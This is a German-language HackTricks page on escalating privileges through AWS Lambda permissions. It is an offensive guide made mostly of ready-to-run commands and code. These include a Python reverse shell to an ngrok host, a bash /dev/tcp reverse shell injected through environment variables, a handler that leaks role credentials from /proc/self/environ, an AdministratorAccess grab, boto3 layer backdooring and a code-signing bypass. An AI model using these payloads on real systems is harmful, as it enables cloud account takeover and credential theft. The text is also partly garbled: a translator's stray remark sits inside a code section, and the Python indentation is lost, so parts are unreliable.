# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Mehr Informationen zu lambda in:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Benutzer mit den **`iam:PassRole`, `lambda:CreateFunction` und `lambda:InvokeFunction`** Berechtigungen können ihre Privilegien eskalieren.\
Sie können **eine neue Lambda-Funktion erstellen und ihr eine bestehende IAM-Rolle zuweisen**, wodurch die Funktion die mit dieser Rolle verbundenen Berechtigungen erhält. Der Benutzer kann dann **Code in diese Lambda-Funktion schreiben und hochladen (z. B. mit einer rev shell)**.\
Sobald die Funktion eingerichtet ist, kann der Benutzer deren Ausführung auslösen und die gewünschten Aktionen durch Aufrufen der Lambda-Funktion über die AWS API durchführen. Dieser Ansatz ermöglicht es dem Benutzer effektiv, Aufgaben indirekt über die Lambda-Funktion auszuführen und mit dem Berechtigungsniveau zu operieren, das der zugewiesenen IAM-Rolle gewährt wird.\\

Ein Angreifer könnte dies ausnutzen, um eine **rev shell zu erhalten und das Token zu stehlen**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Du könntest auch **abuse the lambda role permissions** direkt aus der lambda function selbst ausnutzen.\
Wenn die lambda role über genügend permissions verfügte, könntest du sie nutzen, um dir admin rights zu gewähren:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Es ist auch möglich, ein Leak der Zugangsdaten der lambda-Rolle zu erhalten, ohne eine externe Verbindung zu benötigen. Dies wäre nützlich für **Network isolated Lambdas**, die für interne Aufgaben verwendet werden. Wenn unbekannte security groups deine reverse shells filtern, ermöglicht dir dieses Code-Snippet, die Zugangsdaten direkt als Ausgabe der lambda zu erhalten (als Leak).
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Mögliche Auswirkung:** Direkter privesc auf die angegebene beliebige lambda service role.

> [!CAUTION]
> Beachte, dass, auch wenn es verlockend erscheint, **`lambda:InvokeAsync`** für sich genommen **nicht** erlaubt, **`aws lambda invoke-async`** auszuführen — du benötigst außerdem `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Wie im vorherigen Szenario kannst du dir die Berechtigung **`lambda:InvokeFunction`** gewähren, wenn du die Berechtigung **`lambda:AddPermission`** hast.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Direkter privesc auf die angegebene beliebige lambda-Service-Rolle.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Benutzer mit **`iam:PassRole`, `lambda:CreateFunction`, und `lambda:CreateEventSourceMapping`**-Berechtigungen (und möglicherweise `dynamodb:PutItem` und `dynamodb:CreateTable`) können indirekt **escalate privileges** erzielen, selbst ohne `lambda:InvokeFunction`.\
Sie können eine **Lambda function mit bösartigem Code erstellen und ihr eine vorhandene IAM role zuweisen**.

Anstatt die Lambda direkt aufzurufen, richtet der Benutzer eine neue oder vorhandene DynamoDB table ein oder nutzt sie und verknüpft sie über ein event source mapping mit der Lambda. Diese Konfiguration stellt sicher, dass die Lambda function **automatisch ausgelöst wird, wenn ein neuer Eintrag** in der Tabelle erfolgt, entweder durch eine Aktion des Benutzers oder einen anderen Prozess, wodurch die Lambda function indirekt aufgerufen wird und der Code mit den Berechtigungen der übergebenen IAM role ausgeführt wird.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Wenn DynamoDB bereits in der AWS-Umgebung aktiv ist, muss der Benutzer nur **das Event Source Mapping für die Lambda-Funktion einrichten**. Ist DynamoDB hingegen nicht im Einsatz, muss der Benutzer **eine neue Tabelle mit aktiviertem Streaming erstellen**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Jetzt ist es möglich, **connect the Lambda function to the DynamoDB table** durch **creating an event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Wenn die Lambda-Funktion mit dem DynamoDB stream verknüpft ist, kann der Angreifer **die Lambda-Funktion indirekt auslösen, indem er den DynamoDB stream aktiviert**. Dies kann erreicht werden durch **das Einfügen eines Items** in die DynamoDB table:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potentielle Auswirkung:** Direkter privesc auf die angegebene lambda-Service-Rolle.

### `lambda:AddPermission`

Ein Angreifer mit dieser Berechtigung kann **sich (oder anderen) beliebige Berechtigungen gewähren** (dies erzeugt ressourcenbasierte Richtlinien, um Zugriff auf die Ressource zu gewähren):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potential Impact:** Direkte privesc auf die lambda service role, indem die Berechtigung zum Ändern des Codes und zum Ausführen gewährt wird.

### `lambda:AddLayerVersionPermission`

Ein Angreifer mit dieser Berechtigung kann **sich selbst (oder anderen) die Berechtigung `lambda:GetLayerVersion` gewähren**. Er könnte auf das Layer zugreifen und nach Schwachstellen oder sensiblen Informationen suchen.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potentielle Auswirkungen:** Potenzieller Zugriff auf sensible Informationen.

### `lambda:UpdateFunctionCode`

Benutzer mit der **`lambda:UpdateFunctionCode`** Berechtigung haben die Möglichkeit, **den Code einer vorhandenen Lambda-Funktion zu ändern, die mit einer IAM role verknüpft ist.**\
Der Angreifer kann **den Code der Lambda ändern, um die IAM credentials zu exfiltrieren.**

Obwohl der Angreifer möglicherweise nicht die direkte Möglichkeit hat, die Funktion aufzurufen, ist es wahrscheinlich, dass eine bereits vorhandene und aktive Lambda-Funktion durch bestehende Workflows oder Events ausgelöst wird, wodurch die Ausführung des modifizierten Codes indirekt ermöglicht wird.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Mögliche Auswirkung:** Direkter privesc auf die verwendete lambda Service-Rolle.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Mit diesen permissions ist es möglich, environment variables hinzuzufügen, die bewirken, dass die Lambda beliebigen Code ausführt. Zum Beispiel ist es in python möglich, die environment variables `PYTHONWARNING` und `BROWSER` auszunutzen, um einen python-Prozess dazu zu bringen, beliebige Befehle auszuführen:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Für andere Skriptsprachen gibt es weitere env variables, die man verwenden kann. Für mehr Informationen siehe die Unterabschnitte zu Skriptsprachen in:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE über Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) ermöglicht es, **code** in Ihrer lamdba Funktion einzubinden, ihn jedoch **separat zu speichern**, sodass der function code klein bleiben kann und **mehrere Funktionen code gemeinsam nutzen können**.

Innerhalb von lambda kann man die Pfade prüfen, aus denen python code geladen wird, mit einer Funktion wie der folgenden:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Ausnutzung

Es ist möglich, die Berechtigung `lambda:UpdateFunctionConfiguration` auszunutzen, um einer lambda-Funktion **eine neue layer hinzuzufügen**. Um beliebigen Code auszuführen, muss diese layer einige **Bibliotheken enthalten, die die lambda importieren wird.** Wenn Sie den Code der lambda lesen können, finden Sie das leicht; beachten Sie außerdem, dass die lambda **möglicherweise bereits eine layer verwendet** und Sie diese layer **herunterladen** und dort **Ihren Code hinzufügen** könnten.

Zum Beispiel, nehmen wir an, die lambda verwendet die Bibliothek boto3 — das würde eine lokale layer mit der neuesten Version der Bibliothek erstellen:
```bash
pip3 install -t ./lambda_layer boto3
```
Du kannst `./lambda_layer/boto3/__init__.py` öffnen und **die backdoor im globalen Code hinzufügen** (eine Funktion, um exfiltrate credentials zu erlangen oder z.B. eine reverse shell zu bekommen).

Dann zippe das Verzeichnis `./lambda_layer` und **lade die neue lambda layer hoch** in deinem eigenen Account (oder im Account des Opfers, aber du hast dafür möglicherweise keine Berechtigungen).\
Beachte, dass du einen python-Ordner erstellen und die Bibliotheken dort ablegen musst, um /opt/python/boto3 zu überschreiben. Außerdem muss die Layer **kompatibel mit der python-Version** sein, die von der lambda verwendet wird, und wenn du sie in deinem Account hochlädst, muss sie in der **gleichen Region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Mache jetzt die hochgeladene lambda layer **für jedes Konto zugänglich**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Und hänge den lambda layer an die victim lambda function an:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Der nächste Schritt wäre entweder, **die Funktion aufzurufen** (falls möglich) oder abzuwarten, bis **sie auf normalem Weg aufgerufen wird** — was die sicherere Methode ist.

Eine **heimlichere Methode, diese Schwachstelle auszunutzen**, findest du in:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Direkter privesc auf die verwendete lambda service role.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Vielleicht kannst du mit diesen Berechtigungen eine Funktion erstellen und sie über die URL ausführen... aber ich konnte keinen Weg finden, das zu testen — sag mir Bescheid, wenn du einen findest!

### Lambda MitM

Einige lambdas werden **sensible Informationen von den Nutzern in Parametern empfangen.** Wenn du RCE in einer davon erreichst, kannst du die Informationen exfiltrieren, die andere Nutzer an sie schicken — siehe:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Referenzen

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Wenn eine Lambda-Funktion Code Signing erzwingt, kann ein Angreifer, der entweder die Code Signing Config (CSC) entfernt oder sie auf Warn herabstuft, nicht signierten Code in die Funktion deployen. Dies umgeht Integritätsschutzmaßnahmen, ohne die IAM-Rolle der Funktion oder Trigger zu verändern.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- Für Path B brauchst du kein AWS Signer-Profil, wenn die CSC-Policy auf `WARN` gesetzt ist (nicht signierte Artefakte erlaubt).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Bereite eine kleine Nutzlast vor:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Pfad A) CSC entfernen, dann code aktualisieren:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Pfad B) Herabstufen auf Warn und update code (falls delete nicht erlaubt ist):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Verstanden. Ich werde die relevanten englischen Texte in src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc/README.md ins Deutsche übersetzen und dabei genau die Markdown- und HTML-Syntax, Links, Pfade, Tags, Code, Technik- und Plattformnamen (z. B. aws, gcp), sowie die genannten Ausnahmen unverändert lassen.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Potentielle Auswirkung: Möglichkeit, beliebigen nicht signierten Code in eine Funktion hochzuladen und auszuführen, die eigentlich signierte Deployments durchsetzen sollte, was möglicherweise zur Codeausführung mit den Berechtigungen der Funktionsrolle führt.

Bereinigung:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

